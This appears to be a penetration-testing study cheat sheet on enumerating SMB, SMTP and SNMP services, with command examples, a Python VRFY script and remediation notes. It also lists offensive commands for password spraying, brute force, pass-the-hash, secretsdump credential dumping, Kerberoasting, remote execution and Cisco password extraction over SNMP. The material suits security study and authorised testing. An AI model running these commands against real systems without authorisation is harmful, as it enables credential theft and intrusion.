# Service Enumeration: SMB, SMTP, and SNMP

Techniques for enumerating common network services to discover users, shares, configurations, and potential vulnerabilities.

---

## SMB Enumeration

SMB (Server Message Block) is a critical file/service sharing protocol that can expose shares, users, groups, permissions, and domain intelligence.

### Common Ports

| Port | Proto | Service       |
|------|-------|---------------|
| 139  | TCP   | netbios-ssn   |
| 445  | TCP   | microsoft-ds  |
| 137  | UDP   | netbios-ns    |
| 138  | UDP   | netbios-dgm   |

### Host Discovery

```bash
nmap -v -p 139,445 -oG smb-scan.txt 192.168.50.0/24
sudo nbtscan -r 192.168.50.0/24
```

### Nmap NSE Scripts

```bash
# OS and protocol discovery
nmap -p 139,445 --script smb-protocols,smb-os-discovery,smb2-security-mode TARGET_IP

# Comprehensive enumeration
nmap --script smb-enum-shares,smb-enum-users,smb-enum-sessions,smb-enum-processes,smb-enum-domains,smb-enum-groups -p445 TARGET_IP

# Vulnerability scan
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103 -p445 TARGET_IP
nmap --script smb-vuln* -p445 TARGET_IP

# Brute force
nmap --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt -p445 TARGET_IP
```

### smbclient (Interactive)

```bash
# List shares anonymously
smbclient -L //TARGET_IP -N

# Connect to specific share
smbclient //TARGET_IP/ShareName -U user%pass

# Null session attempt
smbclient -L //TARGET_IP -U ""%
```

### rpcclient (Low-level RPC)

```bash
rpcclient -U "" -N TARGET_IP
> enumdomusers
> enumdomgroups
> netshareenumall
> querydominfo
> getdompwinfo
```

### enum4linux (All-in-one)

```bash
enum4linux -a TARGET_IP
enum4linux -U -S -G -P TARGET_IP
```

### CrackMapExec (Mass Audit)

```bash
# Share enumeration across network
crackmapexec smb 192.168.50.0/24 -u users.txt -p passwords.txt --shares

# Null session check
crackmapexec smb 192.168.50.0/24 -u '' -p '' --shares

# Password spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
```

### smbmap

```bash
smbmap -H TARGET_IP -u user -p pass
smbmap -H TARGET_IP -u user -p pass --download 'SHARE$/file.txt'
smbmap -H TARGET_IP -u user -p pass -x 'whoami'
```

### Impacket Suite

```bash
# Remote execution
wmiexec.py user:pass@TARGET_IP
psexec.py domain/user:pass@TARGET_IP
smbexec.py user:pass@TARGET_IP

# Credential dumping
secretsdump.py user:pass@TARGET_IP

# Kerberos attacks
GetUserSPNs.py domain.com/user:password -dc-ip DC_IP -request
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat
```

### Pass-the-Hash

```bash
crackmapexec smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:HASH'
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH administrator@TARGET_IP
```

### Windows Commands

```cmd
net view \\DC01 /all
net use Z: \\server\share
```

```powershell
Get-SmbSession
Get-SmbOpenFile
Get-SmbShare
Test-NetConnection -ComputerName TARGET_IP -Port 445
```

### SMB Security Notes

- **SMBv1**: Deprecated, vulnerable to EternalBlue -- should be disabled
- **SMBv2**: Improved security, but still has specific vulnerabilities
- **SMBv3**: Modern encryption, but implementation flaws exist (SMBGhost)
- Common misconfigs: null sessions, guest account active, SMB signing disabled, excessive share permissions

---

## SMTP Enumeration

SMTP (Simple Mail Transport Protocol) can expose user enumeration, mail server configuration, and email infrastructure details.

### Key Commands

| Command         | Description                                    |
|-----------------|------------------------------------------------|
| `VRFY <user>`   | Verify if a user exists                        |
| `EXPN <list>`   | Expand a mailing list (often disabled)         |
| `RCPT TO:<user>`| Check if recipient is valid                    |
| `EHLO hostname` | Extended greeting -- returns supported features|
| `HELO hostname` | Basic greeting                                 |

### Manual Enumeration with Netcat

```bash
nc -nv 192.168.50.8 25
```

Example session:
```
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected
```

### Python VRFY Script

```python
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[2], 25))
banner = s.recv(1024)
print(banner)
s.send(b'VRFY ' + sys.argv[1].encode() + b'\r\n')
result = s.recv(1024)
print(result)
s.close()
```

### smtp-user-enum Tool

```bash
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U users.txt -t TARGET_IP
smtp-user-enum -M EXPN -U users.txt -t TARGET_IP
```

### Nmap SMTP Scripts

```bash
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} TARGET_IP
nmap --script smtp-commands,smtp-open-relay -p 25 TARGET_IP
nmap --script ssl-enum-ciphers -p 465,587 TARGET_IP
```

### MX Record and Email Policy Analysis

```bash
dig MX target.com
dig TXT target.com | grep -i spf
dig TXT _dmarc.target.com
dig TXT default._domainkey.target.com
```

### Open Relay Testing

```bash
nmap --script smtp-open-relay -p 25 TARGET_IP
```

### Common Usernames to Try

```
root, admin, administrator, user, test, support, helpdesk, sysadmin, postmaster, webmaster, info
```

### MTA-Specific Behaviors

- **Postfix**: Often returns "252 2.0.0" for valid users
- **Sendmail**: May return detailed user information
- **Exchange**: Typically more restrictive, may require authentication

---

## SNMP Enumeration

SNMP (Simple Network Management Protocol) is a network management protocol that often exposes sensitive infrastructure information through community strings and MIB tree walking.

### SNMP Versions

| Version      | Auth           | Encryption  | Notes                          |
|--------------|----------------|-------------|--------------------------------|
| v1           | Community      | None        | Default strings, trivial       |
| v2c          | Community      | None        | Same weakness as v1            |
| v3 (DES)     | User/Password  | DES-56      | Weak, brute-forceable          |
| v3 (AES)     | User/Password  | AES-256     | Strong when properly configured|

### Discovery

```bash
sudo nmap -sU --open -p 161,162,10161,16161 10.0.0.0/24 -oG snmp-open.txt
```

### Community String Brute Force (onesixtyone)

```bash
echo public private company123 > communities.txt
seq 1 254 | sed 's|^|10.0.0.|' > targets.txt
onesixtyone -c communities.txt -i targets.txt -o snmp-found.txt
```

### Enumerate Full MIB Tree

```bash
snmpwalk -c public -v2c -t 5 10.0.0.5
```

### Specific OID Enumeration

| Task                   | OID                      | Command                                                |
|------------------------|--------------------------|--------------------------------------------------------|
| System Info            | `1.3.6.1.2.1.1.1.0`      | `snmpget -c public -v1 TARGET 1.3.6.1.2.1.1.1.0`     |
| Uptime                 | `1.3.6.1.2.1.1.3.0`      | `snmpget -c public -v1 TARGET 1.3.6.1.2.1.1.3.0`     |
| Windows Users          | `1.3.6.1.4.1.77.1.2.25`  | `snmpwalk -c public -v1 TARGET 1.3.6.1.4.1.77.1.2.25`|
| Running Processes      | `1.3.6.1.2.1.25.4.2.1.2` | `snmpwalk -c public -v1 TARGET 1.3.6.1.2.1.25.4.2.1.2`|
| Installed Software     | `1.3.6.1.2.1.25.6.3.1.2` | `snmpwalk -c public -v1 TARGET 1.3.6.1.2.1.25.6.3.1.2`|
| Listening TCP Ports    | `1.3.6.1.2.1.6.13.1.3`   | `snmpwalk -c public -v1 TARGET 1.3.6.1.2.1.6.13.1.3` |

### Network Topology Discovery

```bash
# Routing table
snmpwalk -c public -v2c TARGET 1.3.6.1.2.1.4.21.1.1

# ARP table
snmpwalk -c public -v2c TARGET 1.3.6.1.2.1.4.22.1.2

# Network interfaces
snmpwalk -c public -v2c TARGET 1.3.6.1.2.1.2.2.1.2
```

### Device-Specific Enumeration

```bash
# Cisco config extraction
snmpwalk -c private -v2c TARGET 1.3.6.1.4.1.9.2.1.55

# Cisco password extraction
snmpwalk -c private -v2c TARGET 1.3.6.1.4.1.9.2.1.56

# Windows user accounts
snmpwalk -c public -v2c TARGET 1.3.6.1.4.1.77.1.2.25

# Windows processes
snmpwalk -c public -v2c TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows installed software
snmpwalk -c public -v2c TARGET 1.3.6.1.2.1.25.6.3.1.2
```

### Python SNMP Example

```python
from pysnmp.hlapi import *

for (errorIndication, errorStatus, errorIndex, varBinds) in bulkCmd(
    SnmpEngine(),
    CommunityData('public', mpModel=0),
    UdpTransportTarget(('10.0.0.5', 161)),
    ContextData(),
    0, 10, ObjectType(ObjectIdentity('1.3.6.1.2.1.1'))
):
    for varBind in varBinds:
        print(varBind)
```

### Remediation Priorities

1. Change default community strings
2. Implement SNMPv3 with encryption
3. Restrict SNMP access to management networks
4. Disable SNMP on unnecessary devices
5. Monitor SNMP traffic for anomalies
